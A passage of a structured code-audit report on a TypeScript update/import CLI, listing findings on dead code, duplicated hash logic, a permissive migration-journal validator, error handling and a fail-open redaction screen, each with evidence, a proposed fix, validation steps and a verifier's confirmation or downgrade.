`packages/core/src/update/preview.ts:39` · removal confidence: medium

**Problem.** The branded type exists for the CLI's human output boundary. The CLI renders update preview paths with renderPath, which returns a plain string, so the brand is never applied and does not protect anything.

**Evidence.**

```
`grep -rn SafeRenderedPath apps packages tests` finds only preview.ts:32,39 and the index.ts:154 re-export. apps/cli/src/commands/update/index.ts:157 `...owner.paths.create.map((path) => `  create   ${renderPath(path)}`)`
```

**Fix.** Either type renderPath's return as SafeRenderedPathV1 (moving the type to the CLI boundary), or delete the type and its re-export. The spec mirror at design spec line 2075 can stay as documentation.

**Validation.** Typecheck and run the core index export-list test after updating its expected list.

**Verifier (confirmed).** A grep finds SafeRenderedPathV1 only at preview.ts:39, the re-export at update/index.ts:154, and the spec at lines 2075/2205. The CLI's renderPath does not produce the brand. The type has no runtime cost, mirrors the spec and is documented at preview.ts:33-38, so the impact is trivial: dead type surface plus a spec claim, at line 2205, that the CLI does not honor.

### W2-COMPOSE-3 · duplication · manifest-foundation-bindings hash is reimplemented in seven places; compose exports a copy nobody imports

`apps/cli/src/update/compose.ts:1953`

**Problem.** `developer-os/manifest-foundation-bindings/v1\0` + JSON.stringify(ids) is computed by private copies in core manifest-state.ts:447 (the validator that decides admission), core manifest/bootstrap.ts:1522, CLI bootstrap/executor.ts:2136, lifecycle/uninstall.ts:173, lifecycle/testing.ts:72, commands/git/service.ts:217 and compose.ts:1953. The validator's copy is not exported, so every writer restates it, and any drift surfaces only as an admission refusal at runtime. compose.ts exports manifestFoundationBindingsHash, but no other file imports it.

**Evidence.**

```
compose.ts:1953-1954: `export function manifestFoundationBindingsHash(ids: readonly string[]): LowerHexSha256 { return createHash("sha256").update("developer-os/manifest-foundation-bindings/v1\0").update(JSON.stringify(ids)).digest("hex") as LowerHexSha256; }`; grep -rn "manifestFoundationBindingsHash" apps packages --include=*.ts (src) finds only compose.ts:1679 and :1953; `grep -rn "manifest-foundation-bindings"` finds the six other copies listed.
```

**Fix.** Export foundationBindingsHash from core manifest-state.ts (via the core index) and import it in compose.ts and the other CLI sites. Delete the local copies and the unused compose export.

**Validation.** pnpm typecheck; grep for the domain string should then hit only core manifest-state.ts.

**Verifier (confirmed).** Confirmed: the domain string plus JSON.stringify hash appears in compose.ts:1954, core manifest-state.ts:449, core manifest/bootstrap.ts:1523, bootstrap/executor.ts:2136, lifecycle/uninstall.ts:173, lifecycle/testing.ts:72 and commands/git/service.ts:217. One part of the claim is slightly wrong: manifestFoundationBindingsHash is used inside compose.ts at line 1679. Only the `export` keyword is unused, since no other file imports it. This does not duplicate CORE-LIFE-2 (guard helpers) or CORE-UPD-6 (compareUtf8), and no BACKLOG row tracks it. Low severity holds.

### W2-COMPOSE-4 · duplication · #rollbackCapacity restates planRollback's capacity formula with literal sizes instead of the named constants

`apps/cli/src/update/compose.ts:1110`

**Problem.** The doc comment says it is "as `planRollback` previews it", but the formula is copied. planning.ts uses COORDINATOR_JOURNAL_BYTES (64 MiB) and PARTICIPANT_JOURNAL_BYTES (1 MiB). compose.ts hardcodes `64 * MiB` and `MiB` with its own `MiB` constant. A change to either constant or to the component list in planning.ts leaves the composed rollback capacity silently different from the preview the user approved.

**Evidence.**

```
compose.ts:1119-1120: `component("journals", 64 * MiB + (leaves + 4) * MiB, leaves + 5), component("terminal_compaction_headroom", 64 * MiB, 1),`; planning.ts planRollback: `component("journals", COORDINATOR_JOURNAL_BYTES + (leaves + 4) * PARTICIPANT_JOURNAL_BYTES, leaves + 5), component("terminal_compaction_headroom", COORDINATOR_JOURNAL_BYTES, 1),`.
```

**Fix.** Extract one exported `rollbackCapacityComponents(entryCount, aggregateBytes, leaves)` in planning.ts. Use it from both planRollback and #rollbackCapacity.

**Validation.** pnpm typecheck; the existing compose/rollback capacity tests stay green.

**Verifier (confirmed).** Confirmed. compose.ts:1119-1120 hardcodes `64 * MiB + (leaves + 4) * MiB` and `64 * MiB`, while planning.ts:821-822 uses COORDINATOR_JOURNAL_BYTES and PARTICIPANT_JOURNAL_BYTES (planning.ts:210-211). The doc comment says the formula matches planRollback's preview. rollback-apply.ts:70 rechecks the composed capacity against a fresh observation, so drift would change the enforced requirement silently, and no shared helper pins the two together. The values are equal today, so this is low-severity duplication.

### W2-CONSTR-1 · logic · Schema-migration journal validator admits `compacting` with any forward/compensation cursors

`packages/core/src/update/migrations.ts:661` · fixed in fb4f87d3; this line is the post-fix code (re-pointed 2026-10-07, NEW-193)

**Problem.** The docstring at 673-676 promises that every cursor a phase does not use is held at zero or null. The `compacting` arm checks only `compaction !== null`. A compacting journal whose nextForwardFoundation is short of forwardCount (a half-applied migration) or whose compensationNext is mid-walk therefore validates. apps/cli/src/update/migration-participant.ts:105-109 accepts any validated `compacting` journal and compacts each Foundation ref, and line 75 refuses compensation once the phase is compacting. A corrupted or mis-written journal is never detected: compaction removes the Foundation journals of a migration that neither finished nor rolled back, with no way back to compensation. construction.ts:1329 pins the equivalent arm (`noCompensation && handedOff`), so the two journals disagree.

**Evidence.**

```
migrations.ts:701 `(phase === "compacting" && compaction !== null);`. Node probe against packages/core/dist/update/migrations.js with a 4-ref plan (forwardCount 2): `{phase:"compacting", nextForwardFoundation:1, compensationNext:null, compactionNext:0}` -> ACCEPTED; `{phase:"compacting", nextForwardFoundation:2, compensationNext:1, compactionNext:0}` -> ACCEPTED. Control `{phase:"finalized", nextForwardFoundation:1}` -> refused 'cursors do not match the phase'. The only compacting test (migrations.test.ts:526) uses nextForwardFoundation equal to forwardCount, so it does not cover this case.
```

**Fix.** Bind compacting to its two legal predecessors: `(phase === "compacting" && compaction !== null && ((complete && compensation === null) || compensation === -1))`. Add refusal cases for a mid-apply and a mid-compensation compacting journal.

**Validation.** Rerun probe-mig.mjs after the change: both compacting rows must throw. The existing 'admits a compacting journal' case (nextForwardFoundation 1 of 1) must still pass.

**Verifier (downgraded).** The code matches. migrations.ts:701 checks only `compaction !== null` for compacting, while construction.ts:1329 also requires `noCompensation && handedOff`. The test at migrations.test.ts:526 uses nextForwardFoundation equal to forwardCount, so it does not cover this case. It is not reachable through product code: migration-participant.ts:105 enters compacting only from finalized or rolled_back and keeps the other cursors through the spread, so only a corrupted or hand-edited journal under the owned home can produce the illegal state. The gap is defense in depth, not a live flow bug. The proposed fix (`(complete && compensation === null) || compensation === -1`) correctly covers both legal predecessors.

### W2-CONSTR-2 · flow · No production path enforces that a migration chain starts at the installed schema version

`packages/core/src/update/migrations.ts:540` · related: NEW-111

**Problem.** orderMigrationChain implements the 'chain does not start at the current version' gate only when `anchors` is passed (migration-planning.ts:80-81). No production caller passes anchors. materializeSchemaMigrations (migrations.ts:540) and planner-output admission (planner.ts:727) call it bare. parseMigrations (planner.ts:675-680) checks only the order and contiguity of versions, and UpdatePlannerRequestV1 (planner.ts:127-140) carries no installed schema version per domain to anchor against. A planner draft whose chain starts at v2 while the home is at v1, or that stops short of the target release's schema, is admitted and materialized. The beforeHash binding proves only that the bytes are current, not that they are at the version the step expects. The version gate exists only in migrations.test.ts:173.

**Evidence.**

```
`grep -rn "anchors" packages/core/src apps/cli/src --include=*.ts | grep -v test` shows only the type (migrations.ts:188), the parameter (migration-planning.ts:65,80) and an index re-export. migrations.ts:540 `const ordered = orderMigrationChain(drafts);`. planner.ts:727 `if (orderMigrationChain(migrations).some(...))`.
```

**Fix.** Carry the installed schema version for each domain (and the target release's declared versions) into the planner request or the composition context. Pass `{ product_state, brain }` anchors at planner.ts:727 and migrations.ts:540, and check that the chain ends at the target's version. If v1 intentionally has no schema versions, delete the `anchors` parameter and the test, and record the gap in the spec so the gate does not look enforced.

**Validation.** Add a planner-admission test: a draft whose first fromVersion differs from the request's installed version must be refused. Then grep that every non-test orderMigrationChain call supplies anchors.

**Verifier (downgraded).** It is true that no production caller passes `anchors`: grep shows only the type (migrations.ts:188), the parameter (migration-planning.ts:65,80) and an index re-export. The impact is overstated. Each mutation is bound to the exact current bytes through beforeHash (the planner's runProvider computes it from the snapshot bytes), so a mislabeled chain cannot write bytes that do not belong to the live file. Only the fromVersion/toVersion labels would be wrong. v1 also has no persisted installed-schema-version source at all. planSchemaMigrations, the only consumer of `versions`, has no production caller either, because the packed planner is still owed by NEW-111 / Task 11b. Keep this as a test-only parameter and docs gap under NEW-111.

### W2-CONSTR-3 · dead-code · projectRetainedSchemaMigrationInverse has no production caller; the CLI builds the same persisted projection itself

`packages/core/src/update/migrations.ts:638` · removal confidence: high

**Problem.** Core exports a builder for the retained schema-migration inverse, which assigns blob ordinals as `first + index` and fills `sourceMigrationPlanHash`. Production never calls it. apps/cli/src/update/planning.ts:468-490 builds the same `schema_migration_inverse` projection inline, with its own ordinal scheme (`addBlob` uses `entries.length`), and rollback.ts:483-490 binds the two hash fields later. Two producers of one persisted format can drift, and the tested one is not the one that ships.

**Evidence.**

```
`grep -rlw projectRetainedSchemaMigrationInverse apps packages` -> only migrations.ts, migrations.test.ts, index.test.ts and update/index.ts (a re-export). planning.ts:468 `const migrations = draft.migrations.map((migration): RetainedSchemaMigrationInverseProjectionV1 => ({ schemaVersion: 1, kind: "schema_migration_inverse", ...`.
```

**Fix.** Delete projectRetainedSchemaMigrationInverse and RetainedSchemaMigrationInverseContextV1, along with their re-exports and tests. Alternatively, make planning.ts call one Core projection helper that takes the blob allocator, so only one producer remains.

**Validation.** After deletion, typecheck and grep for zero references. migrations.test.ts:491-508 are the only tests to remove or move.

**Verifier (confirmed).** Verified. `grep -rlw projectRetainedSchemaMigrationInverse` finds only migrations.ts, migrations.test.ts, index.test.ts, update/index.ts and dist. apps/cli/src/update/planning.ts:468-490 builds the same `schema_migration_inverse` projection inline, with `addBlob` allocating the ordinals, and rollback.ts:483-490 (bindRetainedInversePlan) adds the two hash fields later. So two producers of one persisted format exist, and the shipping one is not the one the core tests cover. CORE-UPD-5 in known.json is about scalars.ts, so this is not a duplicate.

### W2-GAP-HOST-3 · logic · Over-cap probing reads, redacts and builds every remaining file; its errors and warnings leak into a run that never imports those files

`apps/cli/src/commands/import.ts:402`

**Problem.** After the cap is reached, every remaining candidate goes through the full prepare(): a guarded 64 KiB read, the whole redaction pass and buildCapture. This happens only to decide between `remaining` and `duplicateCount`. A run with the default 1,000-file cap over a 10,000-entry source still reads and redacts about 9,000 files (up to ~576 MiB). prepare() also adds every probed file's over-broad pattern hits to the `overBroad` set (line 366), so the run warns about patterns matched only in files it did not import. Any non-UntrustedFileRefusal error from a probe (for example EACCES on a file past the cap, or a readExistingCapture error) jumps to the outer catch. The run then returns a failure even though all in-cap imports already committed.

**Evidence.**

```
import.ts:396-405: `if (newCount >= input.cap) { ... const probed = await prepare(candidate); if ("refused" in probed || !(await isDuplicate(probed.built))) remaining += 1; else duplicateCount += 1; continue; }`. import.ts:366: `for (const patternIndex of built.overBroadPatterns) overBroad.add(patternIndex);`. import.ts:456-458: `} catch (error) { remaining += candidates.length - index; return failureFrom(...)`. This was named as an unexamined gap (b) in docs/superpowers/audits/2026-10-05-full-audit.md:32.
```

**Fix.** Past the cap, count without content: add every candidate to `remaining` (as the ephemeral-key branch already does at lines 398-400) and drop the duplicate probe. Or, if the duplicate count must stay, probe without collecting overBroad and treat any probe error as `remaining += 1` instead of failing the run. The first option is a one-line change and matches the documented 'remaining' meaning.

**Validation.** Test: cap=1 over 3 files, where file 3 is chmod 000 and file 2 contains an over-broad pattern hit. Expect exit 0, 1 imported, remaining 2, and no over-broad warning. Today the run fails on file 3.

**Verifier (downgraded).** The over-cap probe is deliberate and documented. The code says 'Probe only' (import.ts:396-405), and knowledge-pipeline.md:183-184 defines `remaining` as 'accepted non-duplicate files beyond the cap', which requires the duplicate probe. The proposed fix of counting without content would break that contract. A probe error that ends the run is also documented ('Run stop. Any other failure mid-run ... ends the run; finalized files stay, and the unprocessed ones are counted in remaining', lines 191-192), and in-cap imports stay committed. One real, minor issue remains: overBroad collects pattern hits from probed files that were never imported (line 366), so the run can print spurious warnings. The cost (64 KiB read plus redaction per over-cap file, bounded by the 10,000-entry walk) is a design trade-off. The audit names it as gap (b), and no NEW row tracks it.

### W2-GAP-HOST-4 · logic · An unreadable file (EACCES/EPERM) inside the cap aborts the whole import instead of becoming a per-file refusal

`apps/cli/src/commands/import.ts:349`

**Problem.** prepare() turns only UntrustedFileRefusal into a per-file `refused` row. readUntrustedText rethrows any other lstat or read error, such as EACCES on a chmod-000 file or EPERM under TCC-protected folders like ~/Documents and ~/Desktop. One such file stops the loop. Files already imported stay committed, the rest are counted as `remaining`, and the run exits with a generic failure. This contradicts the per-file contract ('import refused N file(s); every other file was processed', line 478) and knowledge-pipeline.md §3.1's per-file rows. Under macOS TCC this happens regularly to an `import ~/Documents/...` run from a terminal without Full Disk Access.

**Evidence.**

```
import.ts:346-354: `try { text = await readUntrustedText(...); } catch (error) { if (!(error instanceof UntrustedFileRefusal)) throw error; ... }`. untrusted-file.ts:90-95 rethrows any lstat error other than ENOENT/ENOTDIR. FILE_REFUSAL_CODES (import.ts:87-94) has no permission row.
```

**Fix.** In prepare(), map EACCES/EPERM from readUntrustedText to `{ refused: "import_source_unreadable" }`. Add that reason to FILE_REFUSAL_CODES (operationalFailure) and to knowledge-pipeline.md §3.1. Keep other errors fatal.

**Validation.** Test: a directory holding a.md (readable), b.md (chmod 000) and c.md (readable). Expect a and c imported, b refused with import_source_unreadable, exit 1, remaining 0.

**Verifier (downgraded).** The mechanics are correct. lstat succeeds on a chmod-000 file, the open inside guards.readText throws EACCES, and prepare() rethrows it. But this is the documented contract, not a contradiction of it. knowledge-pipeline.md:185-192 lists a closed set of per-file refusals and says 'Any other failure mid-run ... ends the run with its own code; finalized files stay, and the unprocessed ones are counted in remaining'. The 'every other file was processed' message prints only on the refusal path, so it is not violated. The TCC scenario is overstated: without access, the walk's readdir of ~/Documents would fail before any file is read, so a mid-run EPERM is unlikely. What remains is a UX enhancement: treat an unreadable file as a per-file refusal.

### W2-GAP-STATE-2 · flow · One corrupt journal or unreadable managed artifact makes status fail with no report

`apps/cli/src/commands/status.ts:73`

**Problem.** The status docstring promises that 'an unreadable component degrades to a warning rather than a mutation or a crash'. Config, manifest and agent discovery are each wrapped in try/catch, but drift inspection (line 73-74) and the transaction survey (line 89) are not. `readSurveyedJournal` rethrows the `TransactionStateError` for any malformed but present journal (doctor.ts:340-348). `inspectV2Drift` can throw from `inspectDrift` on an unreadable artifact. Either throw reaches the outer catch (line 107) and returns `failureFrom`, so the whole report, including manifest state and agents, is lost. `doctor` wraps exactly these two reads in `guarded(context, "transactions" | "drift", ...)` (doctor.ts:1786-1797) and still produces a report.

**Evidence.**

```
status.ts:73-74 `const drift = manifest === null ? [] : await inspectManagedDrift(context, manifest, paths);` and status.ts:89 `const incomplete = await listIncompleteTransactions(context);`, neither inside a try. doctor.ts:342-348 `} catch (error) { try { await context.fs.stat(...) } catch (absence) { if (isMissingEntry(absence)) return null; } throw error; }`
```

**Fix.** Wrap both calls the way config, manifest and agents are wrapped: on error, push a redacted warning (`transaction journals are unreadable: ...`, `managed drift could not be inspected: ...`) and continue with [] or a null count. If consumers need to tell 'zero' from 'unknown', make `driftCount` nullable.

**Validation.** Unit test: put a truncated `<state>/transactions/<valid-id>.json` in a fixture home. `runStatus` must return success with a warning and the other fields filled in. Today it returns a failure.

**Verifier (downgraded).** The code matches. status.ts:73-74 (inspectManagedDrift) and status.ts:89 (listIncompleteTransactions) sit outside any try, and readSurveyedJournal (doctor.ts:340-348) rethrows for a present but malformed journal. So runStatus returns failureFrom and loses the whole report, which contradicts its docstring. Doctor guards these same two reads at doctor.ts:1786-1797. status.test.ts has no case for an unreadable journal or for drift. Downgraded because journals are written atomically, so corruption takes external damage or disk faults. Also, readInstallNonce already swallows its own errors, and failureFrom still prints a redacted error naming the cause.

### W2-GAP-STATE-3 · inconsistency · Garden regroups lint's title duplicates with a weaker fold and suggests retiring both notes

`apps/cli/src/commands/automation/garden.ts:81` · related: NEW-134

**Problem.** `brain lint` groups title duplicates by `perceptualKey(screenControlCharacters(title)).toLowerCase()`. That key applies NFC and strips invisible characters, so 'Café' (NFC) and 'Café' (NFD), or 'Caching' and 'Cach\u200Bing' (with a U+200B zero-width space), form one group (lint.ts:691). Index titles are stored raw, because parseNote does not normalize. Garden's `structuralCommands` then regroups lint's findings by `note.title.toLowerCase()`, which splits such a pair into two single-note groups. The single-note branch emits `developer-os brain retire '<path>' --dry-run`. So a duplicate pair that should become one `refactor --merge` suggestion comes out as two retire suggestions, one for each note.

**Evidence.**

```
garden.ts:81 `const key = finding.key === "title" ? `title\0${note.topicFolder}\0${note.title.toLowerCase()}` : ...`. lint.ts:691 `${note.topicFolder}\u0000${perceptualKey(screenControlCharacters(note.title)).toLowerCase()}`. Node probe against packages/security/dist: `lint same NFC/NFD: true garden same: false`; `lint same ZWSP: true garden same: false`.
```

**Fix.** In garden.ts:81, build the key with the expression lint uses (`perceptualKey(screenControlCharacters(note.title)).toLowerCase()`). Better: export one `duplicateTitleKey(note)` from brain lint and call it from both places.

**Validation.** garden.test.ts case: two notes in one topic folder, titled `Café` and `Café`, plus their lint `duplicates` findings. structuralCommands must return one `refactor --merge` line and no `retire` line.

**Verifier (downgraded).** Confirmed at garden.ts:81. The title key is `note.title.toLowerCase()`, while lint groups by perceptualKey(screenControlCharacters(title)).toLowerCase(), and build.ts:524 stores the title raw. A pair that lint groups (NFC vs NFD, or a hidden invisible character) therefore splits into two single-note groups, and each gets a `retire` suggestion instead of one `merge`. Downgraded because the output is advisory only: every suggestion is a printed `--dry-run` command that a human must run. It also needs exotic titles, the very normalization/invisible cases that lint's NEW-11 hardening targets.

### W2-PLANNER-2 · security · Trust-boundary owner-draft admission skips the stricter validateOwnerDraft rules, which no current-process path calls

`packages/core/src/update/planner.ts:605`

**Problem.** admitTargetUpdateDraft is where the current process admits untrusted target-planner output. Its parseOwnerPlan reimplements owner-draft validation but leaves out four rules that owner.ts validateOwnerDraft enforces: (1) directory, symlink, ephemeral and block rows are keep-only (isChangeableOwnerArtifact); planner.ts:641-642 lets `remove` through for any non-null-blob row. (2) Changed content must be at most 16 MiB; planner.ts:572 lets target_bundle content up to 512 MiB through. (3) Effect artifactTokens must equal the exact Codex partition; planner.ts:651-656 accepts any ordered subset. (4) An effect requires at least one change; planner.ts:839 only rejects an empty operation list, so a keep-only list with an effect passes. validateOwnerDraft and rehydrateOwnerCreates have no caller in apps/ or outside owner.ts (only tests and the target-side planOwners). The concrete divergence: CLI codexEffectOf (apps/cli/src/update/planning.ts:752) proceeds on a keep-only Codex plan that carries an effect, so the plan-only preview reports an external effect. `update --apply` then refuses in composition (compose.ts:1360 -> participants.ts:450 `an effect without a file change`) with update_composition_owner instead of update_planner_output_invalid. The same split applies to directory removals (participants.ts:360) and >16 MiB bundle content (participants.ts:366).

**Evidence.**

```
planner.ts:641-642 `if (isNullBlob(artifact)) fail(`${opLabel}: a blob-less artifact may only be kept`);
    if (kind === "remove") return { operation: "remove", target, expectedHash };`
planner.ts:839 `if (plan.proposedOperations.length === 0 && plan.externalEffects.length > 0) fail(`${label}.ownerPlans: an external effect without operations`);`
owner.ts:155 `if (!isChangeableOwnerArtifact(row)) fail(`${opLabel}: a directory, symlink, ephemeral, or block artifact is keep-only`);`
owner.ts:162 `if (draft.externalEffects.length > 0 && changes === 0) fail(`${label}.externalEffects: an effect without a file change`);`
owner.ts:110 `if (!same(effect.artifactTokens, draft.currentArtifacts)) fail(`${label}.artifactTokens: not the exact Codex partition`);`
planning.ts:752 `if (plan === undefined || (!changed && plan.externalEffects.length === 0)) return null;`
```

**Fix.** After parseOwnerPlan builds each OwnerUpdateDraftV1, call validateOwnerDraft(draft, request.manifest), or have parseOwnerPlan delegate to it, and delete the duplicated checks. planner-protocol.ts already re-exports owner.js, so owner.ts is in the planner import graph. Then drop the now-redundant line 839 check.

**Validation.** Add admitTargetUpdateDraft tests that each refuse: (a) a keep-only Codex owner draft carrying an effect; (b) a `remove` of an installed directory token; (c) a replace whose target_bundle content declares 16_777_217 bytes; (d) an effect whose artifactTokens is a strict subset of the Codex partition.

**Verifier (downgraded).** The divergence is real. parseOwnerPlan (planner.ts:620-671) lets `remove` through for directory, symlink and ephemeral rows. It accepts target_bundle content up to MAX_OBSERVED_BYTES (line 571), not 16 MiB. It accepts any ordered subset of the Codex partition as effect tokens. Its only effect check is at line 839, which tests for an empty operation list; it never checks that a file changes. owner.ts validateOwnerDraft (118-165) enforces all four rules, but its only non-test caller is planOwners on the target side. However, this is not a security hole. Every case fails closed later in participant composition: participants.ts:360 refuses a remove of anything but a file, :366 refuses content over 16 MiB, and :450 refuses an effect without a file change. The CLI codexEffectOf (planning.ts:749-768) ignores artifactTokens, so a subset changes nothing. The real impact is a misleading plan-only preview, which materializePlannerDraft builds without composing participants, plus a different refusal code at apply. Reclassify the kind as inconsistency with low severity. The fix (call validateOwnerDraft inside parseOwnerPlan) is sound.

### W2-PLANNER-3 · dead-code · updateCompensationSteps/compensateParticipants are an unused second compensation walk that diverges from the coordinator

`packages/core/src/update/participants.ts:119` · removal confidence: high

**Problem.** The coordinator computes compensation with its own cursor, updateCompensationCursor (coordinator.ts:664-669), which clamps `cursor` to `steps.length - 1`. participants.ts also exports ReachedUpdateStepsV1, updateCompensationSteps and compensateParticipants. That copy fails when `nextStep >= steps.length` instead of clamping, and nothing in production calls it. participants.test.ts:440 pins the dead version, so tests give false confidence about compensation order. This is the same class as CORE-UPD-5 (exports reachable only through index re-exports and tests), but in a different file.

**Evidence.**

```
participants.ts:121 `if (!Number.isSafeInteger(reached.nextStep) || reached.nextStep < 0 || reached.nextStep >= reached.steps.length) fail("ReachedUpdateStepsV1.nextStep");`
coordinator.ts:666 `for (let index = Math.min(cursor, steps.length - 1); index >= 0; index -= 1) {`
grep -rn "updateCompensationSteps\|compensateParticipants" packages apps --include=*.ts (excluding dist) -> only participants.ts, update/index.ts re-export, index.test.ts:424/501, participants.test.ts:12/18/440
```

**Fix.** Delete ReachedUpdateStepsV1, updateCompensationSteps and compensateParticipants plus their index re-exports and the export-list entries. Move the reverse-order assertions in participants.test.ts onto updateCompensationCursor.

**Validation.** Run typecheck, lint, and the full suite after the deletion. A compensation-order test against updateCompensationCursor covers what participants.test.ts:440 covered.

**Verifier (confirmed).** Verified with grep over apps, packages and tests, excluding dist. ReachedUpdateStepsV1, updateCompensationSteps and compensateParticipants (participants.ts:111-134) are referenced only by update/index.ts:358/373/406, the export-list test index.test.ts:424/501, and participants.test.ts:12/18/440/454. Production compensation goes through coordinator.ts updateCompensationCursor (665-670, used at 1005/1073/1077), which clamps with Math.min(cursor, steps.length - 1), while updateCompensationSteps fails when nextStep >= steps.length. The divergence is real but harmless because the code is dead. This is the same class as CORE-UPD-5, but that entry covers scalars.ts, so this is not a duplicate. Removal confidence is high.

### W2-PLANNING-2 · logic · up_to_date after a rollback is refused as a trust replay (exit 5)

`apps/cli/src/update/planning.ts:622`

**Problem.** Rollback keeps the trust high watermark (Spec 2: rollback never lowers the persisted release-trust high watermarks), so after a rollback active.releaseSequence is lower than trust.highestAcceptedReleaseSequence. `update --version <active version>` selects up_to_date and then calls advanceReleaseTrust with the active release's sequence. Core's advance() throws 'release replay' for any lower sequence, and classified() turns that into update_trust_replay with exit 5 (security refusal), even though the signed metadata and the active identity are genuine.

**Evidence.**

```
planning.ts:622-623 `await classified("update_trust_replay", EXIT_CODES.securityRefusal, () =>
      advanceReleaseTrust(home.trust, { ...metadata, releaseSequence: current.releaseSequence, releaseIdentityHash: current.releaseIdentityHash }));`. Probe against packages/core/dist with trust highestAcceptedReleaseSequence "3" and active sequence "2": `threw: Error invalid ReleaseTrustStateV1 release replay (no code)`.
```

**Fix.** In the up_to_date branch, check only metadata freshness, not the release position. Either advance with the trust's own accepted release (trust.highestAcceptedReleaseSequence/releaseIdentityHash), or use admitReleaseAgainstTrust(home.trust, current, "guarded_active") for the release together with a metadata-only advance check.

**Validation.** Add a planning test: a home whose active record is the rolled-back previous release while trust stays at the newer one; `planUpdate({version: active.version})` must return outcome up_to_date, not update_trust_replay.

**Verifier (downgraded).** Confirmed. In release.ts:485-487, advance() throws `release replay` whenever nextSequence < sequence. The up_to_date branch (planning.ts:622-623) passes current.releaseSequence. A rollback keeps the trust watermark (rollback-apply.ts:57, participants.ts:126), so after a rollback `update --version <active version>` refuses with update_trust_replay, exit 5. No test pins this case: planning.test.ts:120 covers only active == latest. It is reachable only through an explicit --version naming the rolled-back active release. A plain `update` picks latest, and admitReleaseAgainstTrust accepts latest because it equals the watermark. The impact is a wrong exit class on a narrow path, so the severity drops to low.

### W2-PLANNING-4 · flow · Scratch cleanup failure in finally masks the planning refusal and its exit code

`apps/cli/src/update/planning.ts:686`

**Problem.** When download, extract or materializeUpdate throws (for example update_capacity_insufficient with exit 1, or a security refusal with exit 5), the finally block awaits attempt.cleanup(). ReleasePlanningScratchAttempt.cleanup can throw because it journals and preserves unknown entries. Its error then replaces the original one, so the user sees the cleanup's reason and exit class instead of the cause, and the cause is lost.

**Evidence.**

```
planning.ts:685-687 `} finally {
    if (!retainedScratch) await attempt.cleanup();
  }`; security scratch.ts:886-896 cleanup performs journal updates and #remove per item.
```

**Fix.** Catch the cleanup error when a primary error is already in flight and rethrow the primary error, attaching the cleanup failure as `cause` or as an AggregateError. Let the cleanup error propagate only on the success path.

**Validation.** Add a test with a fixture whose planner throws and whose scratch.cleanup also throws; the refusal reason must be the planner's, and the cleanup error must be attached as cause.

**Verifier (confirmed).** Confirmed at planning.ts:685-687: `} finally { if (!retainedScratch) await attempt.cleanup(); }`. ReleasePlanningScratchAttempt.cleanup (packages/security/src/update/scratch.ts ~886-905) can throw recovery errors, for example release_scratch_plan_identity or release_scratch_unrecorded_path. When it does, its error replaces the primary one in flight. The case where both fail together (a hostile or failed extract that leaves unknown entries, then a refused cleanup) is plausible, and the original cause is lost. The severity stays low: the cleanup's recovery-required refusal is still an actionable state.

### W2-PLANNING-6 · duplication · recover() hardcodes the envelope file names that updateConstructionEnvelopePaths owns

`apps/cli/src/update/construction.ts:559`

**Problem.** The construction store gets every envelope path from Core's updateConstructionEnvelopePaths (this.#paths). recover() instead checks root listings against literal basenames. If Core renames an envelope file, recovery refuses every closure as exit 6 while the rest of the store keeps working.

**Evidence.**

```
construction.ts:559 `if (names.length !== 1 || names[0] !== "update-construction.plan.pending")`, :567 `["update-construction.journal.pending"]`, :568 `"update-construction.plan.json"`, :574 `names.join("/") !== "update-construction.plan.json"`; core construction.ts:488-491 defines the same names in updateConstructionEnvelopePaths.
```

**Fix.** Derive the basenames from this.#paths, for example `const base = (p: string) => p.slice(p.lastIndexOf("/") + 1);`, and compare against base(this.#paths.planPending), base(this.#paths.plan) and base(this.#paths.journalPending).

**Validation.** The existing construction recover tests for the plan_pending, journal_bootstrap and plan_only_suffix frontiers stay green.

**Verifier (confirmed).** Confirmed. construction.ts:559, 567, 568 and 574 hardcode 'update-construction.plan.pending', 'update-construction.journal.pending' and 'update-construction.plan.json'. Core updateConstructionEnvelopePaths (packages/core/src/update/construction.ts:485-493) owns the same names, and the store already holds them in this.#paths. This is real duplication. The impact is low: these names are a persisted on-disk format, so renaming them is already a migration event, and the recover tests would catch any drift.

### W2-PORTS-1 · security · Construction secret screen fails open without a redaction key and ignores the user's redaction patterns

`apps/cli/src/update/apply-ports.ts:1200` · related: NEW-27

**Problem.** screenOf is the only secret screen over every construction row and source frame. When the key is absent it silently returns, so screening is off. When the key is present it builds the redactor with `userPatterns: []`. Every other redactor on the update path refuses when the key is absent (redactorOf at line 197, runPlanner in update/context.ts:573) and loads `config.redaction.patterns`. `update rollback --apply` never runs the planner, so nothing earlier on that path requires the key. On that path a home without a key stages retained preimage blobs with no screening at all, and a home with a key screens them without the user's own patterns.

**Evidence.**

```
apply-ports.ts:1200-1207:
  let redactor: ReturnType<typeof createRedactor> | null = null;
  const key = readRedactionKey(context.paths.stateDir);
  if (key !== null) redactor = createRedactor(key, { userPatterns: [] });
  return (bytes, scope) => {
    if (redactor === null) return;

Compare apply-ports.ts:197-198 (redactorOf): `readRedactionKey(...) ?? refuse("update_redaction_key_absent", EXIT_CODES.recoveryRequired, ...)` and `createRedactor(key, { userPatterns: config?.redaction?.patterns ?? [] })`; update/context.ts:573-581 does the same.
```

**Fix.** Build the screen from redactorOf, which refuses when the key is absent and includes user patterns. Because it is async, resolve it once in `construction(id)` or make the construction-store factory async. Keep the `() => undefined` screen only in compactStaging, which writes no new bytes.

**Validation.** Unit test: productionUpdateApplyPorts(...).construction(id) with no redaction key under the state dir must reject with update_redaction_key_absent. With a key and a config pattern `ACME-[0-9]+`, staging a row containing `ACME-1234` must refuse with update_construction_secret.

**Verifier (downgraded).** The code matches the finding at apply-ports.ts:1200-1207. screenOf returns early when readRedactionKey is null, and it builds the redactor with `userPatterns: []`. redactorOf (line 197) and runPlanner (context.ts:573) both refuse with update_redaction_key_absent and load config.redaction.patterns. The rollback --apply path (rollback-apply.ts -> composeRollback -> construct -> ports.construction -> screenOf) does not run the planner, and redaction-key.ts models an 'absent' key state, so the bypass is reachable. No test or comment says the bypass is intended. I downgraded it because the screened bytes on the rollback path are retained preimages that already sit in owner-only product state. Staging copies them inside the same home and does not send them across a trust boundary. On the forward path the planner has already required the key and screened frames with the user's patterns. The issue is a real inconsistency and a gap in the defense, but it is not a medium-severity exposure.

### W2-PORTS-2 · logic · decodeExact's canonical recheck is unreachable; a torn or corrupt participant journal surfaces as a plain Error, not exit 6

`apps/cli/src/update/bundle-source.ts:211` · related: NEW-53

